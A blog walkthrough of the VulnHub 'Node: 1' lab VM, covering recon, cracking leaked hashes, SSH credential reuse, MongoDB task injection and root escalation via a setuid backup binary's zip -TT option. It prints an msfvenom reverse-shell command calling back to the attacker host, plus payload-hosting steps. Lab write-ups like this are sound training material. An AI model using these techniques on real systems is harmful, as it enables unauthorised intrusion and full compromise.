---
layout: post
date: 2018-08-31 11:09:30 +0000
last_modified_date: 2018-12-09 08:21:08 +0000
title: "Node: 1 Walkthrough"
subtitle: "Glory Glory Man United"
category: Walkthrough
tags: [VulnHub, Node]
comments: true
image:
  feature: node-1-walkthrough.jpg
  credit: despoticlick / Pixabay
  creditlink: https://pixabay.com/en/couple-yellow-manchester-metrolink-2746151/
---

This post documents the complete walkthrough of Node: 1, a boot2root [VM][1] created by [Rob Carr][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Node is a medium level boot2root challenge, originally created for HackTheBox. There are two flags to find (user and root flags) and multiple different technologies to play with.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
```

Nothing unusual. Let's check out "MyPlace".

![99f92446.png](/assets/images/posts/node-1-walkthrough/99f92446.png)

There's a **LOGIN** button at the top right-hand side; it brings us to the login page, of course.

![1ce3e611.png](/assets/images/posts/node-1-walkthrough/1ce3e611.png)

I must say the design looks good.

### AngularJS

The client side of "MyPlace" uses AngularJS. As such, one has to look at the JavaScript files for clues on how to proceed. The go-to tool in my arsenal to do that is the Debugger from the Developer Tools.

![3f6a1382.png](/assets/images/posts/node-1-walkthrough/3f6a1382.png)

Look what happens when I enter the highlighted route into the address bar.

![ee0491b2.png](/assets/images/posts/node-1-walkthrough/ee0491b2.png)

The database exposes all the users' password hashes! Let's clean up the usernames and hashes, and sent it to John the Ripper for offline cracking.

![2f27ba85.png](/assets/images/posts/node-1-walkthrough/2f27ba85.png)

Login to the admin account with credential (`myP14ceAdm1nAcc0uNT:manchester`).

![0ec05271.png](/assets/images/posts/node-1-walkthrough/0ec05271.png)

Voila.

Click on the **Download Backup** button to bring up a dialog box to save the plaintext file, `myplace.backup` because I'm not going to open a 3.3MB file in the text editor.

![25431aaa.png](/assets/images/posts/node-1-walkthrough/25431aaa.png)

### File Analysis

Like any good security analyst worth his salt, I'm putting on my forensics hat to examine the file in greater details.

![fde1d30b.png](/assets/images/posts/node-1-walkthrough/fde1d30b.png)

If I had to guess, I would say the file `myplace.backup` is the `base64` encoding of the another file.

![00dd6751.png](/assets/images/posts/node-1-walkthrough/00dd6751.png)

I'm right. Now, let's unzip the bugger.

![a1783961.png](/assets/images/posts/node-1-walkthrough/a1783961.png)

Hmm. It's a password-protected archive. No big deal. There's nothing John the Ripper can't handle.

```
# zip2john myplace.backup.zip > myplace.backup.zip.hash
# john --show --format=pkzip myplace.back.zip.hash
myplace.backup.zip:magicword:::::myplace.backup.zip

1 password hash cracked, 0 left
```

Turns out the archive is the backup of the "MyPlace" site. And right off the bat, I notice a username and password. I know, I'm sharp. :smirk:

![f8cb05e1.png](/assets/images/posts/node-1-walkthrough/f8cb05e1.png)

Here's the code that generates the file `myplace.backup`. More on that later.

![29cce38a.png](/assets/images/posts/node-1-walkthrough/29cce38a.png)

### Low-Privilege Shell

The rest of the code seems pretty water-tight to me. I'm guessing the credential (`mark:5AYRft73VtFpc84k`) could also be the credential to log in through SSH. Let's give it a shot.

![3746d516.png](/assets/images/posts/node-1-walkthrough/3746d516.png)

There you have it.

During enumeration of `mark`'s account, I found the following:

+ There are other accounts on the system: `frank` and `tom`
+ `frank` is a distraction :no_good:
+ `tom` is running node on `/var/scheduler/app.js`

![9f935b96.png](/assets/images/posts/node-1-walkthrough/9f935b96.png)

You see, `tom` is running each command in the `tasks` collection every 30,000 milliseconds (or thirty seconds). If I can somehow insert a row into `tasks`, `tom` will execute it for me.

Let's do it this way. We transfer a reverse shell over to the VM.

I've checked `uname -a` beforehand; I know that it's running a 64-bit Ubuntu. We generate a reverse shell with `msfvenom` on my attacking machine like so.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=1234 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

Host the reverse shell with Python's SimpleHTTPServer module.

```
# python -m SimpleHTTPServer 80
```

Download the reverse shell to `/tmp/rev` with `wget` and make it executable.

![77f70ca9.png](/assets/images/posts/node-1-walkthrough/77f70ca9.png)

### Mongo Shell

It's time to insert my command to run the reverse shell into the `tasks` collection.

![9a042201.png](/assets/images/posts/node-1-walkthrough/9a042201.png)

Sweet. On the attacking machine, I set up a `nc` listener to receive the reverse shell.

![fc36b4e0.png](/assets/images/posts/node-1-walkthrough/fc36b4e0.png)

Awesome. But, let's give ourselves a better looking shell with the Python pseudo-TTY trick.

![47c1ba65.png](/assets/images/posts/node-1-walkthrough/47c1ba65.png)

### User Flag

The user flag is at `/home/tom/user.txt`.

![5f151c33.png](/assets/images/posts/node-1-walkthrough/5f151c33.png)

### Privilege Escalation

Remember `/usr/local/bin/backup`? It's the key to privilege escalation—it's `setuid` to `root`.

![f0b1db0f.png](/assets/images/posts/node-1-walkthrough/f0b1db0f.png)

Having said that, we need to get a copy of the file to my machine for further analysis.

On the VM, do the following.

```
$ gzip -c < /usr/local/bin/backup > /tmp/backup.gz
$ base64 < /tmp/backup.gz
H4sIAL7Zq1kAA+ybe3Qb1Z3HR44ShDGOCYEEyB6G3YRHha2HZckmZWEk62FbtkaS9TIPR4+RRrZe
lmZkyQ0tWccEE3xOdmGB/WMLu4ez5PTQnu5uT8t2t63TQEKXnt2U0pKewx/p4aUUtrAQktCm0f5+
d/TyxEDCv+srX/3mc+/9fe9r7pVGM/6G1WlTKBRUPbRR6yikB/cpVQawj+6U0g0UTV1O3UrdSG2j
NhCG+CCUgUiDA8b1kKaEuA7iOPD4HqUK49XAV9fyFLVIAvhiPEdTFEb0p7qkfJUG4k+UKow5SBAg
bqjlt4HZDPmbIQ9jBRjjhlodGHkoz0PdGAeBB1vy2LeFmPNGinI+rVSRCGnOlnw35FOrhA1S9ZQH
8lvbdxbSzrb0T5NKRjSpWHcqmRFLPYVsj17K66rl28d8tbGWNOma7+ba2GG+4asf/eaufzkQdDxL
X2Z5/PF//N5TliSWv6GmQcaKJq4k7dsjby7L2xtvOd4E8TkZ98g4LeNdMhZlPCbjv5bxbhnfJOOQ
...
```

On the attacking machine, reverse the process.

```
# echo H4sIAL...AAA== > backup.gz.b64
# base64 -d < backup.gz.b64 > backup.gz
# gunzip -c < backup.gz > backup
```

I observed the following about the program:

+ The number of arguments must be at least three
+ The first argument is: `-q`
+ The second argument must be one of the strings in `/etc/myplace/keys`
+ The third argument must be a path that's not blacklisted.

![ca7562f3.png](/assets/images/posts/node-1-walkthrough/ca7562f3.png)

Once the arguments pass the checks, the program will use the `system` library function to execute `zip` to create the archive file.

The program is perfect in all aspects except for this—it doesn't check for `-T` and `-TT`. These options allow `zip` to test the compression (`-T`) with an external command (`-TT`).

Once we know how `/usr/local/bin/backup` works, exploiting it to give us a `root` shell is easy. Let's reuse our reverse shell in `/tmp/rev` if you still remember it.

![0864e7d5.png](/assets/images/posts/node-1-walkthrough/0864e7d5.png)

On our `nc` listener, a `root` shell returns!

![84aa2dca.png](/assets/images/posts/node-1-walkthrough/84aa2dca.png)

### Root Flag

After spawning the pseudo-TTY shell, retrieving the root flag is a piece-of-cake.

![9f3aa2c7.png](/assets/images/posts/node-1-walkthrough/9f3aa2c7.png)

:dancer:

### Afterthought

The VM sure has its fair share of troll traps like the one you see below.

![66dfbe98.png](/assets/images/posts/node-1-walkthrough/66dfbe98.png)

Right in the beginning during fuzzing for directories or files, if your `User-Agent` matches blacklisted ones, e.g. DirBuster, you get to see the troll face plus some random string. And in `/usr/local/bin/backup`, again if your path contains blacklisted ones, e.g. `/root`, `/etc` or even single characters such as `;`, `&` or `|`, you'll get a ZIP file in `base64` encoding, containing `root.txt` that displays the same troll face.

It sure was fun.

[1]: https://www.vulnhub.com/entry/node-1,252/
[2]: https://twitter.com/@iamrastating
[3]: https://www.vulnhub.com/
